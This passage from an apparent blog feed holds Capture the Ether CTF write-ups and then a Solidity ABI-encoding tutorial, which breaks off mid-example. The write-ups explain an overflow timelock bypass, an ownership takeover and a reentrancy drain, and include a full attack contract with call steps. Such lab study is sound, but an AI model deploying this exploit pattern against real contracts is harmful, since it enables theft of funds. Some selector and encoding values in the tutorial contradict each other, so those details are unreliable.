1 days</code>时才会执行 else 语句，如果能使<code>queue[queue.length - 1].unlockTimestamp == 2**256 - 1</code>，就会造成上溢出，加上后边的 1，就等于 0 了，然后将 <code>timestamp = 0</code>传入，绕过 <code>withdraw()</code>函数的 require 要求。</p></li></ol><p>解题步骤：</p><ol><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>1, 2**256 -1</code>，由于在代码中的 1 应该是以为妙为单位，所以这里需要进行单位转换，<code>1 day =  24*60*60=86400s</code>，构造溢出 <code>timestamp = queue[queue.length - 1].unlockTimestamp + 1 days </code>，即<code>queue[queue.length - 1].unlockTimestamp + 86400 = 2**256</code>，所以需要传入的参数为 115792089237316195423570985008687907853269984665640564039457584007913129553536</p><p><img src="/image/capturetheether.assets/image-20220326222312412.png" alt="image-20220326222312412"></p><p>会将<code>queue.length ，head</code>分别覆盖为<code>1,115792089237316195423570985008687907853269984665640564039457584007913129553536</code></p></li><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>2, 0</code>,此时<code>queue.length，head</code>分别被覆盖为<code>2,0</code>，timestamp + 1 后溢出为 0，绕过<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days</code>判断，所以现在绕过 withdraw 限制；</p></li><li><p>调用函数 <code>withdraw(1)</code>，只需要取出 index 1之前的即可。</p></li></ol><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第一道题比较简单，只需要先调用<code>AssumeOwmershipChalleng</code>函数成为 owner，然后再调用<code>authenticate</code>函数就可以完成题目。</p><h3 id="Token-Bank"><a href="#Token-Bank" class="headerlink" title="Token Bank"></a>Token Bank</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    // Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line">    string public name = &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            //retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        // Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        // the token contract&#x27;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] = 500000 * 10**18;  // half for me</span><br><span class="line">        balanceOf[player] = 500000 * 10**18;      // half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第二道题， TokenBankChallenge 合约就相当于一个银行，玩家一开始会有 500000 eth 的余额，可以通过 withdraw 使用这部分余额购买使用 SimpleERC223Token 实现的 Token，银行持有的 Token 为 1000000 ether，通过该题目的条件是让银行合约持有的 Token 清零。</p><p>注意代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里判断 to 地址是否为合约地址，如果是合约地址的话就用 ITokenReceiver 接口来调用 to 合约的 tokenFallback 函数，tokenFallback 函数回更改目标的 balance，但是由于这里的 to 地址可控，所以存在 <strong>任意外部调用类型漏洞</strong>，只需要在攻击合约中命令一个 tokenFallback 函数，就可以在 transfer 的执行过程中额外调用攻击合约的函数，又因为在 withdraw 函数中 对 <code>token.transfer</code>的调用在 require 函数中，所以这里还存在重入漏洞。</p><p>整个的攻击思路为：</p><p>​    部署一个攻击合约，将 player 的 Token 转让给这个合约，攻击合约再把 Token 转化为银行的 balance，可以以合约身份执行 withdraw 函数，触发重入。</p><p>调用<code>token.transfer</code>函数后余额会更新，允许重复提取存入的资金，重入的控制流程是：<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... repeat until empty</code></p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address addr_TokenBankChallenge = 0xD8555E9A128C07928C1429D834640372C8381828;</span><br><span class="line">    address addr_SimpleERC223Token  = 0x8D8ACb16e0FAec90e078123FAfa0F2a7e759B556;</span><br><span class="line">    TokenBankChallenge TokenBank;</span><br><span class="line">    SimpleERC223Token SimpleERC223;</span><br><span class="line">    uint256 check;</span><br><span class="line">    function Attack() payable&#123;</span><br><span class="line">        TokenBank = TokenBankChallenge(addr_TokenBankChallenge);</span><br><span class="line">        SimpleERC223 = SimpleERC223Token(addr_SimpleERC223Token);</span><br><span class="line">    &#125;</span><br><span class="line">    function action1() public &#123;</span><br><span class="line">        SimpleERC223.transferFrom(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB,address(this),500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function action2() public &#123;</span><br><span class="line"></span><br><span class="line">        SimpleERC223.transfer(addr_TokenBankChallenge,500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        check=check+1;</span><br><span class="line">        if(check &lt;= 2)&#123;</span><br><span class="line">        TokenBank.withdraw(500000 * 10**18);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>初始 player 的账户的余额为：<code>500000000000000000000000</code>，首先调用 withdraw 函数把 player 的余额全部转换成 SimpleERC223Token 中的 token<img src="/Users/banana69/blog/ctf/capturetheether.assets/image-20220401151218782.png" alt="image-20220401151218782"></p><p><img src="/image/capturetheether.assets/image-20220401151306973.png" alt="image-20220401151306973"></p></li><li><p>然后再调用 <code>SimpleERC223Token</code>合约中的 approve 函数，授权攻击合约可以使用所有的 token</p><p> <img src="/image/capturetheether.assets/image-20220401151456754.png" alt="image-20220401151456754"></p></li><li><p>调用攻击合约中的 action1 将原本 player 的 token  转移到智能合约的账户中</p><p> <img src="/image/capturetheether.assets/image-20220401151844688.png" alt="image-20220401151844688"></p><p> <img src="/image/capturetheether.assets/image-20220401151852050.png" alt="image-20220401151852050"></p></li></ol><ol start="4"><li><p>然后调用攻击合约中的 action2 ，即调用 transfer 函数向 <code>TokenBankChallenge</code> 合约将 token 转为 balance，但是由于在 transfer 函数中会判断转入的地址是否为合约地址，如果为合约地址的话会将 balance 退回到发起转账的账户，即退回到了攻击合约中，此时攻击合约的余额为<code>500000000000000000000000</code></p><p> <img src="/image/capturetheether.assets/image-20220401153046304.png" alt="image-20220401153046304"></p><p> <img src="/image/capturetheether.assets/image-20220401153107117.png" alt="image-20220401153107117"></p></li><li><p>最后调用攻击合约中的 tokenFallback 函数（参数任意），该函数中会调用 <code>TokenBankChallenge</code> 合约中的 withdraw 函数，而在 withdraw 函数中又会执行 <code>token.transfer(msg.sender，amount)</code>，且对余额的更新在执行 transfer 之后，所以这里就会造成重入漏洞，且在执行 transfer 时，<code>address to</code> 是一个可控的变量，为攻击合约的地址，在攻击合约中可以定义 tokenFallback 函数，当判断到地址 to 为合约地址时就会重入调用攻击合约中的 tokenFallback 函数，这里的 check 为控制 withdraw 函数执行俩次就可以将合约中的balance清零。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Guess-the-secret-number&quot;&gt;&lt;a href=&quot;#Guess-the-secret-number&quot; class=&quot;headerlink&quot; title=&quot;Guess the secret number&quot;&gt;&lt;/a&gt;Guess the secret </summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Solidity函数选择器与参数编码</title>
    <link href="https://banana69.site/2021/10/17/Solidity%20Function%20Selector/"/>
    <id>https://banana69.site/2021/10/17/Solidity%20Function%20Selector/</id>
    <published>2021-10-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:41:27.781Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-Basic-Design"><a href="#0x01-Basic-Design" class="headerlink" title="0x01 Basic Design"></a>0x01 Basic Design</h4><p><strong>ABI (Application Binary Interface，应用二进制接口)</strong> 是以太坊生态系统中从区块链外部与合约进行交互以及合约间进行交互的一种方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><p>通常，ABI 是俩个程序模块之间的接口，其中之一通常处于机器代码级别，接口是将数据编码/解码到机器代码中(从机器代码中解码出来)的方法。在以太坊中，它是如何编码 Solidity 合约调用以及如何从交易中读取数据的基础。</p><h4 id="0x02-Function-Selector"><a href="#0x02-Function-Selector" class="headerlink" title="0x02 Function Selector"></a>0x02 Function Selector</h4><p>为了能够在以太坊上部署智能合约，合约函数被编译成 <strong>EVM</strong> 字节码，并添加了一段称为函数选择器的代码，作为合约代码的入口点。</p><p>一个函数调用数据的前 <strong>4</strong> 字节，指定了要调用的函数。这就是某个函数签名的 <strong>Keccak</strong> 哈希的前 4 字节（高位在左的大端序）。例如，<code>bytes4(keccak256(&#39;balanceOf(address)&#39;)) == 0x70a08231</code> 这种形式，<code>0x70a08231</code> 便是<code>balanceOf(address)</code>的 <strong>Function Selector</strong>。</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格；</li><li>对于 <strong>uint</strong> 类型，要转成 <strong>uint256</strong> 进行计算，比如 <code>ownerOf(uint256)</code> 其 <strong>Function Selector =</strong> <code>bytes4(keccak256(&#39;ownerOf(uint256)&#39;)) == 0x6352211e</code>；</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来，详细可看下面的例子。</li></ul><p>给出以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public x;</span><br><span class="line">    function test1(bytes3) public &#123;x = 1;&#125;</span><br><span class="line">    function test2(bytes3[2] memory) public  &#123; x = 1; &#125;</span><br><span class="line">    function test3(uint32 x, bool y) public  &#123; x = 1; &#125;</span><br><span class="line">    function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;</span><br><span class="line">    function test5(uint, Test memory test) public &#123; x = 1; &#125;</span><br><span class="line">    function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;</span><br><span class="line">    function test7(uint[][] memory,string[] memory) public &#123; x = 1; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 函数选择器</span><br><span class="line">&#123;</span><br><span class="line">    &quot;0d2032f1&quot;: &quot;test1(bytes3)&quot;,</span><br><span class="line">    &quot;2b231dad&quot;: &quot;test2(bytes3[2])&quot;,</span><br><span class="line">    &quot;92e92919&quot;: &quot;test3(uint32,bool)&quot;,</span><br><span class="line">    &quot;4d189ce2&quot;: &quot;test4(uint256,uint32[],bytes10,bytes)&quot;,</span><br><span class="line">    &quot;4ca373dc&quot;: &quot;test5(uint256,(string,string,uint256))&quot;,</span><br><span class="line">    &quot;ccc5bdd2&quot;: &quot;test6(uint256,(string,string,uint256)[])&quot;,</span><br><span class="line">    &quot;cc80bc65&quot;: &quot;test7(uint256[][],string[])&quot;,</span><br><span class="line">    &quot;0c55699c&quot;: &quot;x()&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//计算函数选择器</span><br><span class="line">function selector() public view returns (bytes4) &#123;</span><br><span class="line">return this.test1.selector;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-Argument-Encoding"><a href="#0x03-Argument-Encoding" class="headerlink" title="0x03 Argument Encoding"></a>0x03 Argument Encoding</h4><p>从第 <strong>5</strong> 个字节开始是被编码的参数。这种编码也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的 <strong>4</strong> 个字节则不需要再进行编码。</p><ul><li><p>基础类型：</p><ul><li><p><code>uint&lt; M &gt;</code> ： M 位的无符号整数，0 &lt; M &lt;= 256、M % 8 == 0；</p></li><li><p><code>int&lt; M &gt;</code>：以 2 为补码作为符号的 M 位整数，0 &lt; M &lt;= 256、M % 8 ==0；</p></li><li><p><code>address</code>：除了表示地址类型外，还等价于 uint160，在计算和函数选择器中通常使用 address；</p></li><li><p><code>bool</code>：等价于 uint8，取值为 0 或 1，在计算和函数选择器中通常使用 bool；</p></li><li><p><code>ixed&lt; M &gt;x&lt; N &gt;</code>：M 位的有符号固定小数位的是十进制数字，8 &lt;= M &lt;= 256、M % 8 == 0、且 0 &lt; N &lt;= 80，</p></li><li><p><code>fixed、ufixed</code>：fixed128x18 和 ufixed128x18 的同义词，在计算和函数选择器中通常使用 fixed128x18 和 ufixed128x18；</p></li><li><p><code>bytes&lt; M &gt;</code>：M 字节的二进制类型，0 &lt; M &lt;= 32；</p></li><li><p><code>function</code>：一个地址（20字节）后跟一个函数选择器（4字节），编码之后等价于bytes24.</p></li></ul></li><li><p>定长数组类型：</p><p><code>&lt; type &gt;[M]</code>：有 M 个元素的定长数组，M &gt;= 0，数组元素为给定类型。</p></li><li><p>非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…，<code>Tn</code>，<code>n &gt;= 0</code> 构成的 元组tuple。</li></ul></li></ul><ul><li><p>对参数的编码具有以下属性：</p><p>1、读取的次数取决于参数数组结构中的最大深度；也就是说，要取得 <code>a_i[k][l][r]</code> 需要读取 <strong>4</strong> 次。在先前的 <strong>ABI</strong> 版本中，在最糟的情况下，读取的次数会随着动态参数的总数而线性地增长。</p><p>2、一个变量或数组元素的数据，不会被插入其他的数据，并且是可以再定位的；也就是说，它们只会使用相对的 “地址”。</p></li><li><p>还需要区分静态和动态类型：</p><p>以下类型被称为<strong>动态</strong>：</p><ul><li><code>bytes</code></li><li><code>string</code></li><li>任意类型 T 的变长数组 <code>T[]</code></li><li>任意动态类型 T 的定长数组 <code>T[k]</code> （<code>k &gt;= 0</code>）</li><li>由动态的 <code>Ti</code> （<code>1 &lt;= i &lt;= k</code>）构成的 元组元组 <code>(T1,...,Tk)</code></li></ul><p>而所有非动态类型被称为<strong>静态</strong>。</p><p>静态类型会被直接编码，动态类型会在当前数据块之后单独分配的位置被编码。</p><p>参考动态类型的编码原理；<a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">https://ctf-wiki.org/blockchain/ethereum/selector-encoding/</a></p><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其<code>offset、length、data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul></li></ul><ul><li>一般来说大体而言，一个以 <code>a_1, ..., a_n</code> 为参数的对 <code>f</code> 函数的调用，会被编码<code>function_selector(f) enc((a_1, ..., a_n))</code>，<code>f</code> 的返回值 <code>v_1, ..., v_k</code> 会被编码为<code>enc((v_1, ..., v_k))</code>，也就是说，返回值会被组合为一个元组进行编码。</li></ul><h4 id="0x04-例子："><a href="#0x04-例子：" class="headerlink" title="0x04 例子："></a>0x04 例子：</h4><h6 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line">    uint public x;</span><br><span class="line">    function test(uint, uint32[] memory, bytes10, bytes memory) public &#123; </span><br><span class="line">    x = 1; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对以上合约的函数，其函数调用的最终编码为：</p><ul><li><p><code>test(0x123,[&quot;0x11221122&quot;,&quot;0x33443344&quot;],&quot;0x31323334353637383930&quot;,&quot;0x3132333435&quot;)</code></p><ul><li><p>函数选择器：<code>0xa5643bf2</code>，源自<code>test(uint,uint32,bytes10,bytes)</code>的签名；</p></li><li><p>第一个参数 <strong>uint</strong>（静态类型），直接存储其值：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</p></li><li><p>第二个参数 **uint32 []**（动态数组），先存储其 <strong>offset=0x20*4</strong>（4 是参数个数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</p></li><li><p>第三个参数 <strong>bytes10</strong>（静态类型），直接存储其值（从低位开始补0）：<code>0x313233343536373839300000000000000000000000000000000000000000000</code>；</p></li><li><p>第四个参数 <strong>bytes</strong>（动态类型），先存储其 <strong>offset=0x80+0x20*3=0xe0（需要加上前一个动态类型参数的offse，3是前一个动态类型存储其长度和俩个元素占用的插槽个数）</strong>：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>;</p></li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li>第二个参数的长度（<strong>length</strong>）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000011221122</code>;</li><li>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000033443344</code>;</li><li>第四个参数的长度（<strong>length</strong>），5个字节：<code>0x0000000000000000000000000000000000000000000000000000000000000005</code>；</li><li>第四个参数的数据部分（从低位补0）：<code>0x3132333435000000000000000000000000000000000000000000000000000000</code>。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x577563b6                                                             // function selector</span><br><span class="line">0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter</span><br><span class="line">1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter</span><br><span class="line">2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter</span><br><span class="line">3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter</span><br><span class="line">4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter</span><br><span class="line">5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter</span><br><span class="line">6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter</span><br><span class="line">7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter</span><br><span class="line">8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="例2："><a href="#例2：" class="headerlink" title="例2："></a>例2：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function bar(bytes3[2]) public pure &#123;&#125;</span><br><span class="line">  function baz(uint32 x, bool y) public pure returns (bool r) &#123; </span><br><span class="line">  r = x &gt; 32 || y; </span><br><span class="line">  &#125;</span><br><span class="line">  function sam(bytes, bool, uint[]) public pure &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>对于以上合约使用参数 <strong>69</strong> 和 <strong>true</strong> 去调用 <strong>baz</strong>，一共需要传送 <strong>68</strong> 字节，其函数调用的最终编码为：</p><ul><li>函数选择器：<code>0xcdcd77c0</code>，这源自ASCII格式的 <code>baz(uint32,bool)</code> 签名的 <strong>keccak</strong> 哈希的前 4 字节。</li><li>第一个参数，一个被用 0 值字节补充到 32 字节的 uint32 值 <code>69</code>（hex(69)）：<code>0x0000000000000000000000000000000000000000000000000000000000000045</code>：。</li><li>第二个参数，一个被用 0 值字节补充到 32 字节的 boolean 值 <code>true</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>：。</li></ul><p>合起来就是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xcdcd77c000000000000000000000000000000000000000000000000000000000000000450000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></li><li><p>使用<code>dave、ture、[1,2,3]</code>作为参数调用 <strong>sam</strong>，一共需要传送 <strong>292</strong> 字节。</p><ul><li>函数选择器：<code>0xa5643bf2</code>，源自<code>sam(bytes,bool,uint256[])</code>的签名；</li><li>第一个参数（动态类型）的数据部分的位置（从参数编码块开始算起的字节数）：<code>0x0000000000000000000000000000000000000000000000000000000000000060</code>；</li><li>第二个参数（bool 类型的 trure）：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第三个参数（动态类型）的数据部分的位置，由字节数计量，这里是<code>0x0a</code>：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第一个参数的数据部分，以字节数组的元素个数作为开始，这里是<code>4</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000004</code>;</li><li>第一个参数的内容（dave）的 UTF-8 编码（这里等同于ASCII编码），并在低位补0到32字节：<code>0x6461766500000000000000000000000000000000000000000000000000000000</code>;</li><li>第三个参数的数据部分以数组元素的个数开始，这里是<code>3</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li><li>第三个参数的第一个数组元素，1：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>;</li><li>第三个参数的第二个数组元素，2：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第三个参数的第三个数组元素，3：<code>0x0000000000000000000000000000000000000000000000000000000000000003</code>；</li></ul><p>合起来就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa5643bf20000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000464617665000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003</span><br></pre></td></tr></table></figure></li></ul><h6 id="例3："><a href="#例3：" class="headerlink" title="例3："></a>例3：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function f(uint,uint32[],bytes10,bytes) public pure &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用参数<code>(0x123, [0x456, 0x789], &quot;1234567890&quot;, &quot;Hello, world!&quot;)</code>进行对函数<code>f(uint,uint32[],bytes10,bytes)</code>的调用会通过以下方式进行编码：</p><ul><li>函数选择器：<code>0x8be65246</code>;</li><li>第一个参数 <strong>uint</strong>（静态类型），直接存储其 <strong>data</strong>：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</li><li>第二个参数 **uint32 []*<em>（动态类型），先存储其 offset=0x20</em>4（4个参数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</li><li>第三个参数 <strong>bytes10</strong> (静态类型)，直接存储其 <strong>data</strong>（先转为 <strong>ASCII</strong> 码，从低位开始补充0到32字节）：<code>0x3132333435363738393000000000000000000000000000000000000000000000</code>；</li><li>第四个参数 <strong>bytes</strong> (动态类型)，先存储其 <strong>offset=0x80+3*0x20</strong>=第一个动态参数的<strong>offset</strong> + 第一个动态参数的数据部分的长度 ：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>；</li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li><p>第二个参数的 